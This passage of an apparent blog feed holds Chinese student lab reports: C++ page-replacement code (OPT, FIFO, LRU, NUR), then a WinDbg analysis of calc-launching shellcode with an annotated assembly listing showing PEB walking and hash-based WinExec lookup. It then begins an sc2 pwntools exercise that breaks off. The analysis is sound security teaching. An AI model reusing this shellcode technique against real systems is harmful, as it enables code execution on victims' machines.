class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> CMemory::OPT(<span class="keyword">const</span> <span class="keyword">int</span> nTotal_pf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i,j,<span class="built_in">max</span>,maxpage,nDistance,vDistance[TOTAL_VP];</span><br><span class="line">    <span class="comment">//vDistance[TOTAL_VP]表示页面在第几步被处理,其它的是辅助变量，用于计数和中间过渡 </span></span><br><span class="line">initialize(nTotal_pf);<span class="comment">//初始化 </span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;TOTAL_INSTRUCTION;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(_vDiscPages[_vPage[i]].m_nPageFaceNumber==INVALID) </span><br><span class="line">&#123;<span class="comment">//如果页面页号不在物理内存中 </span></span><br><span class="line">_nDiseffect++;</span><br><span class="line"><span class="comment">/* 将不在处理的页面或者最后待处理的页面调出内存 */</span> </span><br><span class="line"><span class="keyword">if</span>(_pFreepf_head==<span class="literal">NULL</span>)</span><br><span class="line">&#123;<span class="comment">//如果分配给进程的物理内存页面无空闲 </span></span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;TOTAL_VP;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(_vDiscPages[j].m_nPageFaceNumber!=INVALID)</span><br><span class="line">&#123;<span class="comment">//如果虚页j已经在物理内存中，将其设置为最后处理 </span></span><br><span class="line">vDistance[j]=<span class="number">32767</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="comment">//如果虚页j不在物理内存中，将vDistance[j]置为0</span></span><br><span class="line">vDistance[j]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">nDistance=<span class="number">1</span>; </span><br><span class="line"><span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;TOTAL_INSTRUCTION;j++)</span><br><span class="line">&#123;<span class="comment">//遍历所有页面，得到所有页面在第几步被处理 </span></span><br><span class="line"><span class="keyword">if</span>((_vDiscPages[_vPage[j]].m_nPageFaceNumber!=INVALID)&amp;&amp;</span><br><span class="line">                       (vDistance[_vPage[j]]==<span class="number">32767</span>))</span><br><span class="line">&#123;<span class="comment">//如果虚页j在物理内存中并且在第32767步被处理，</span></span><br><span class="line">                        <span class="comment">//则将处理步数重置为nDistance </span></span><br><span class="line">vDistance[_vPage[j]]=nDistance;</span><br><span class="line">&#125;</span><br><span class="line">nDistance++;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">max</span>=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;TOTAL_VP;j++)</span><br><span class="line">&#123;<span class="comment">//遍历所有页面找出找出最后处理的页面 </span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">max</span>&lt;vDistance[j])</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">max</span>=vDistance[j];</span><br><span class="line">    maxpage=j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 将最后处理的页面调出 */</span> </span><br><span class="line">_pFreepf_head=&amp;_vMemoryPages[_vDiscPages[maxpage].</span><br><span class="line">                                             m_nPageFaceNumber];</span><br><span class="line">                <span class="comment">//将空闲头指针指向最后处理的页面 </span></span><br><span class="line">_pFreepf_head-&gt;m_pNext=<span class="literal">NULL</span>;<span class="comment">//将空闲头指针指向的下一个位置置空 </span></span><br><span class="line">_vDiscPages[maxpage].m_nPageFaceNumber=INVALID;</span><br><span class="line">                <span class="comment">//将最后处理的页面调出内存 </span></span><br><span class="line">&#125;</span><br><span class="line">_vDiscPages[_vPage[i]].m_nPageFaceNumber=</span><br><span class="line">                _pFreepf_head-&gt;m_nPageFaceNumber;</span><br><span class="line">            <span class="comment">//将待执行指令的页号置为空闲头指针指向的页号 </span></span><br><span class="line">_pFreepf_head=_pFreepf_head-&gt;m_pNext;<span class="comment">//将空闲头指针指向下一个页面 </span></span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="built_in">cout</span>.setf(ios::fixed);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"OPT:"</span>&lt;&lt;fixed&lt;&lt;setprecision(<span class="number">6</span>)&lt;&lt;<span class="number">1</span>-(<span class="keyword">float</span>)_nDiseffect/<span class="number">320</span>&lt;&lt;<span class="string">"\t"</span>;</span><br><span class="line">    <span class="comment">//打印命中率 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="main-函数"><a href="#main-函数" class="headerlink" title="main()函数"></a>main()函数</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;//vector是一种顺序容器，事实上和数组差不多，但它比数组更优越。一般来说数组不能动态拓展，因此在程序运行的时候不是浪费内存，就是造成越界。而vector正好弥补了这个缺陷，它的特征是相当于可分配拓展的数组，它的随机访问快，在中间插入和删除慢，但在末端插入和删除快，而且如果用.at()访问的话，也可以做越界检查。</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;//同&lt;stdlib.h&gt;，c开头是C++的习惯，.h结尾是C的习惯 </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;//同&lt;stdio.h&gt;，c开头是C++的习惯，.h结尾是C的习惯  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;//封装了类UNIX系统下的很多固定名称的system_call系统调用，提供对POSIX操作系统API的访问功能。所以，这个函数是依赖于编译器，依赖于操作系统的。 </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;//声明流操作符，规范输出格式</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INVALID -1</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">int</span> <span class="title">TOTAL_INSTRUCTION</span><span class="params">(<span class="number">320</span>)</span></span>;<span class="comment">//声明全局静态变量指令总数(TOTAL_INSTRUCTION)为320 </span></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">int</span> <span class="title">TOTAL_VP</span><span class="params">(<span class="number">32</span>)</span></span>;<span class="comment">//声明虚页长度(TOTAL_VP)为32 </span></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">int</span> <span class="title">CLEAR_PERIOD</span><span class="params">(<span class="number">50</span>)</span></span>;<span class="comment">//声明进程清零周期(CLEAR_PERIOD)为50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"Page.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"PageControl.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"Memory.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">CMemory a;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">4</span>;i&lt;=<span class="number">32</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">a.FIFO(i);<span class="comment">//FIFO算法命中率 </span></span><br><span class="line">     a.LRU(i);<span class="comment">//LRU算法命中率 </span></span><br><span class="line">a.NUR(i);<span class="comment">//NUR算法命中率</span></span><br><span class="line">a.OPT(i);<span class="comment">//OPT算法命中率 </span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//5p2O5rK76ZyW== </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="实验结果及分析"><a href="#实验结果及分析" class="headerlink" title="实验结果及分析"></a>实验结果及分析</h1><ol><li><p>在RED Hat Linux中通过输入以下命令执行程序；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ -o main mian.cpp</span><br><span class="line">./main</span><br></pre></td></tr></table></figure></li><li><p>得到程序结果如下；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1571280409171.png" alt="1571280409171"></p></li><li><p>结果分析；</p><ol><li>四种页面置换算法OPT算法的命中率最高，其它三种基本相同；</li><li>随着分配内存页面逐渐增加，每种页面置换算法的命中率也会相应增加，并且趋于一个稳定值90%；</li><li>如果次数非常大，这四种置换算法的命中率基本一致；</li></ol></li></ol><h1 id="实验难点与收获"><a href="#实验难点与收获" class="headerlink" title="实验难点与收获"></a>实验难点与收获</h1><h2 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h2><ol><li>对OPT置换算法和对NUR置换算法的理解；</li><li>C++编程中类的使用规范等；</li></ol><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ol><li>学习了四种置换算法的基本原理和C++语言实现；</li><li>通过实验结果，对比得到了四种算法的优劣；</li><li>了解了内存页面调度的机理；</li><li>进一步熟悉了C++中类的调用规范；</li></ol><h1 id="实验思考"><a href="#实验思考" class="headerlink" title="实验思考"></a>实验思考</h1><p>实验通过对四种页面置换算法进行横向对比和纵向对比，展示了四种算法的优缺点；但是实验结果对实验的原理体现的不太明显，可以在实验结果中增加每种算法的执行过程，让算法原理理解。</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统内核实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 存储器管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞分析技术实验一</title>
      <link href="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80.html"/>
      <url>/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h1><p>掌握shellcode在漏洞利用中的基本用法及编码方法。</p><h1 id="实验内容要求"><a href="#实验内容要求" class="headerlink" title="实验内容要求"></a>实验内容要求</h1><ol><li>根据实验软件SCer.exe和shellcode 代码sc1.bin，通过windbg逆向分析弹出计算器的漏洞利用详细过程，形成实验报告提交；</li><li>根据实验题目sc2，撰写详细的解题过程，至少包括漏洞成因分析、漏洞利用思路阐述，最终形成实验报告提交；<a id="more"></a></li></ol><h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="分析sc1-bin弹出计算器的漏洞利用详细过程"><a href="#分析sc1-bin弹出计算器的漏洞利用详细过程" class="headerlink" title="分析sc1.bin弹出计算器的漏洞利用详细过程"></a>分析sc1.bin弹出计算器的漏洞利用详细过程</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul><li>操作系统：Windows XP Professional Service Pack 3</li><li>工具：windbg、Scer.exe、Notepad++</li></ul><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol><li><p>使用SCer.exe测试sc1.bin文件，成功弹出计算器，说明shellcode可以运行；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570694705353.png" alt="1570694705353"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570694728011.png" alt="1570694728011"></p></li><li><p>用scer.exe先把cs1.bin文件转为字符串sc1.bin.sc文件，在最前面加上<code>0xCC</code>。在汇编中<code>0xCC</code>对应的汇编指令为<code>int 3</code>，该指令是系统的中断指令，可以理解为在 windbg中提前设置好了一个断点；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570694910561.png" alt="1570694910561"></p></li><li><p>再使用Scer.exe将更改后得sc1.bin.sc文件转换成可执行得bin文件sc1.bin.sc.mybin；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570695122571.png" alt="1570695122571"></p></li><li><p>打开windbg，依次选择<code>File</code>、<code>Open Executable Files</code>、<code>Scer.exe</code>，使用windbg调试Scer.exe，选择<code>Debug</code>、<code>Go</code>，弹出Scer.exe的界面；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570695714811.png" alt="1570695714811"></p></li><li><p>将sc1.bin.sc.mybin文件拖入Scer.exe输入框，点击执行shellcode，运行至设置的<code>0XCC</code>断点处，根据断点，得到shellcode汇编代码如下；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570696124449.png" alt="1570696124449"></p></li><li><p>开始调试shellcode</p><ol><li><p>先跳转至<code>0x00b40057</code>处；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720367525.png" alt="1570720367525"></p></li><li><p>将地址<code>0x69cc4e7h</code>压入栈中；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720397247.png" alt="1570720397247"></p></li><li><p>调用地址<code>0x00b40003</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720439856.png" alt="1570720439856"></p></li><li><p>将esi置空；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720495667.png" alt="1570720495667"></p></li><li><p>fs寄存器指向TEB结构，TEB结构地址偏移<code>0x30</code>指向PEB结构，即将PEB结构的地址赋给esi；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720534446.png" alt="1570720534446"></p><p>其中PEB结构如下；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    UCHAR InheritedAddressSpace; <span class="comment">// 00h</span></span><br><span class="line">    UCHAR ReadImageFileExecOptions; <span class="comment">// 01h</span></span><br><span class="line">    UCHAR BeingDebugged; <span class="comment">// 02h</span></span><br><span class="line">    UCHAR Spare; <span class="comment">// 03h</span></span><br><span class="line">    PVOID Mutant; <span class="comment">// 04h</span></span><br><span class="line">    PVOID ImageBaseAddress; <span class="comment">// 08h</span></span><br><span class="line">    PPEB_LDR_DATA Ldr; <span class="comment">// 0Ch</span></span><br><span class="line">    …………</span><br><span class="line">&#125;PEB,*PPEB</span><br></pre></td></tr></table></figure></li><li><p>利用PEB结构偏移<code>0x0C</code>找到<code>PPEB_LDR_DATA Ldr</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720591411.png" alt="1570720591411"></p><p>其中_PEB_LDR_DATA结构如下；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Length; <span class="comment">// +0x00</span></span><br><span class="line">    BOOLEAN Initialized; <span class="comment">// +0x04</span></span><br><span class="line">    PVOID SsHandle; <span class="comment">// +0x08</span></span><br><span class="line">    LIST_ENTRY InLoadOrderModuleList; <span class="comment">// +0x0c</span></span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList; <span class="comment">// +0x14</span></span><br><span class="line">LIST_ENTRY InInitializationOrderModuleList;<span class="comment">// +0x1c</span></span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; <span class="comment">// +0x24</span></span><br></pre></td></tr></table></figure></li><li><p>利用<code>PPEB_LDR_DATA Ldr</code>偏移<code>0x1C</code>找到<code>LIST_ENTRY InInitializationOrderModuleList</code>，它是指向<code>LDR_MODULE</code>链表结构中，相应的双向链表头部的指针；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720625434.png" alt="1570720625434"></p></li><li><p>该动态链表按顺序存放着PE装入运行时初始化模块的信息第一个链表节点是ntdll.dll，第二个链表结点就是kernel32.dll，因此偏移<code>0x08</code>处为ntdll.dll地址，即ebp偏移<code>0x08</code>后指向ntdll.dll；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570720888291.png" alt="1570720888291"></p></li><li><p>将esi指向的内存的地址处的数据赋值给esi，即将链表下一节点放入esi；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570722168233.png" alt="1570722168233"></p></li><li><p>从ntdll.dll加载基址算起，偏移<code>0x3c</code>的地方就是其PE文件头，PE头偏移<code>0x78</code>的地方存放着指向函数导出表的指针，连续两次运算，使得ebx的值为<code>0x00003400</code>；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570723107241.png" alt="1570723107241"></p></li><li><p>由于ebx的值为<code>0x00003400</code>，<code>test ebx,ebp</code>结果不改变FLAG寄存器的状态，故不会进行下一步的跳转；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570723521474.png" alt="1570723521474"></p></li><li><p>将输出表地址存入ebx中；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570723747826.png" alt="1570723747826"></p></li><li><p>根据表的结构，在偏移地址<code>0x18</code>处存储着函数数目，把表里的函数数目放入ecx中；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570723703471.png" alt="1570723703471"></p></li><li><p><code>jcxz</code>即<code>jump if cx equals zero</code>，当<code>ecx=0</code>时跳转到<code>0x00b4000f</code>，此时ecx不为0，故不进行跳转；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570724269799.png" alt="1570724269799"></p></li><li><p>导出表偏移<code>0x20</code>处的指针指向存储导出函数函数名的列表，将列表中第一个函数的地址赋给edi；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570724951706.png" alt="1570724951706"></p></li><li><p>将列表中最后一个函数的地址赋值给edi；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570725038291.png" alt="1570725038291"></p></li><li><p>将eax置空，用作索引；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570725066226.png" alt="1570725066226"></p></li><li><p>把edx的每一位变为eax的最高位，再把edx扩展为eax的高位，即变为64位；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570725199028.png" alt="1570725199028"></p></li><li><p>接下来几步构成了一个循环，相当于对函数名进行了一个处理，包括使得ebp中存储的地址变为kernel32.dll的地址；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570771191258.png" alt="1570771191258"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570773348206.png" alt="1570773348206"></p></li><li><p>执行到cmp ，把值和栈顶+4处，一开始入栈的值比较，一开始入栈的其实是winexc经过处理得到的值，对比不相等就再次进行循环，跳到loopne换下一个函数名；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570771333009.png" alt="1570771333009"></p></li><li><p>经过多次循环没找到就会跳回<code>0x00b4000f</code>，换一个dll继续寻找；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570771446664.png" alt="1570771446664"></p></li><li><p>先将数组赋值给edx，存储函数序号，再加上edp，得到函数名称列表地址，再加上<code>ecx*2</code>,得到目标函数序号；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570771910484.png" alt="1570771910484"></p></li><li><p>将edi指向一个RVA数组，再加上ebp存储的kernel32.dll的基地址，得到导出函数地址；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570771986846.png" alt="1570771986846"></p></li><li><p>计算出最终的目标地址；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570772442097.png" alt="1570772442097"></p></li><li><p>使用<code>ret</code>指令返回；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570772516947.png" alt="1570772516947"></p></li><li><p>进行一系列的函数压栈、弹栈操作；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570772640877.png" alt="1570772640877"></p></li><li><p>调用ebp存储的地址<code>0x7c8623ad</code>上存储的<code>winExec</code>函数；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570773507362.png" alt="1570773507362"></p></li><li><p>在进入<code>winExec</code>函数后，执行与上述寻找winexc类似的操作，这里不在叙述，直至找到调用计算器函数<code>calc</code>并执行弹出计算器；</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570774960954.png" alt="1570774960954"></p></li></ol></li><li><p>shellcode的汇编代码及备注如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">jmp00b40057</span><br><span class="line">xoresi,esi&#x2F;&#x2F;将esi置空</span><br><span class="line">movesi,dword ptr fs:[esi+30h]&#x2F;&#x2F;将PEB结构的地址赋给esi</span><br><span class="line">movesi,dword ptr [esi+0Ch]&#x2F;&#x2F;将PPEB_LDR_DATA Ldr结构的地址赋给esi</span><br><span class="line">movesi,dword ptr [esi+1Ch]&#x2F;&#x2F;将LDR_MODULE链表地址赋给esi</span><br><span class="line">movebp,dword ptr [esi+8]&#x2F;&#x2F;将ntdll.dll地址赋给ebp</span><br><span class="line">movesi,dword ptr [esi]&#x2F;&#x2F;将链表下一节点放入esi</span><br><span class="line">movebx,dword ptr [ebp+3Ch]&#x2F;&#x2F;接下来两步将PE头存放着指向函数导出表的指针赋给ebx</span><br><span class="line">movebx,dword ptr [ebp+ebx+78h]</span><br><span class="line">testebx,ebx</span><br><span class="line">je00b400f</span><br><span class="line">addebp,ebp&#x2F;&#x2F;将输出表地址存入ebx中</span><br><span class="line">movecx,dword ptr [ebx+18h]&#x2F;&#x2F;表里的函数数目放入ecx</span><br><span class="line">jcxz00b400f</span><br><span class="line">movedi,dword ptr [ebx+20h]&#x2F;&#x2F;将列表中第一个函数的地址赋给edi</span><br><span class="line">addedi,ebp</span><br><span class="line">movedi,dword ptr [edi+ecx*4-4]&#x2F;&#x2F;将列表中最后一个函数的地址赋给edi</span><br><span class="line">addedi,ebp</span><br><span class="line">xoreax,eax&#x2F;&#x2F;将eax置空，用作索引</span><br><span class="line">cdq&#x2F;&#x2F;把edx的每一位变为eax的最高位，再把edx扩展为eax的高位，即变为64位</span><br><span class="line">adddl,byte ptr [edi]&#x2F;&#x2F;接下来几步构成了一个循环，相当于对函数名进行了一个处理</span><br><span class="line">roredx,4</span><br><span class="line">scasbyte ptr es:[edi]</span><br><span class="line">jne00b40035</span><br><span class="line">cmpedx,dword ptr [edi+4]&#x2F;&#x2F;把值和栈顶+4处，一开始入栈的值比较，一开始入栈的其实是winexc经过处理得到的值，对比不相等就再次进行循环，跳到loopne换下一个函数名</span><br><span class="line">loopne00b40027</span><br><span class="line">jne00b4000f</span><br><span class="line">movedx,dword ptr [ebx+24h]&#x2F;&#x2F;先将数组赋值给edx，存储函数序号，再加上edp，得到函数名称列表地址，再加上ecx*2,得到目标函数序号</span><br><span class="line">addedx,edp</span><br><span class="line">movzxedx,word ptr [edx+ecx*2]</span><br><span class="line">movedi,dword ptr [ebx+1Ch]&#x2F;&#x2F;将edi指向一个RVA数组，再加上ebp存储的kernel32.dll的基地址，得到导出函数地址</span><br><span class="line">addedi,ebp</span><br><span class="line">addebp,dword ptr [edi+edx*4]&#x2F;&#x2F;计算出最终的目标地址</span><br><span class="line">ret&#x2F;&#x2F;使用ret返回指令</span><br><span class="line">push69CCC4E7h&#x2F;&#x2F;进行一系列的函数压栈、弹栈操作</span><br><span class="line">call00b40003</span><br><span class="line">pusheax</span><br><span class="line">push636C6163h</span><br><span class="line">movedx,esp</span><br><span class="line">inceax</span><br><span class="line">pusheax</span><br><span class="line">pushedx</span><br><span class="line">callebp</span><br><span class="line">push2A60A677h</span><br><span class="line">call00b40003</span><br><span class="line">pusheax</span><br><span class="line">callebp&#x2F;&#x2F;调用ebp存储的地址0x7c8623ad上存储的winExec函数</span><br></pre></td></tr></table></figure></li></ol><h2 id="根据实验题目sc2，撰写详细的解题过程"><a href="#根据实验题目sc2，撰写详细的解题过程" class="headerlink" title="根据实验题目sc2，撰写详细的解题过程"></a>根据实验题目sc2，撰写详细的解题过程</h2><h3 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h3><ul><li>操作系统：Kali Linux</li><li>工具：pwntools、gdb</li></ul><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h3><ol><li><p>函数源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 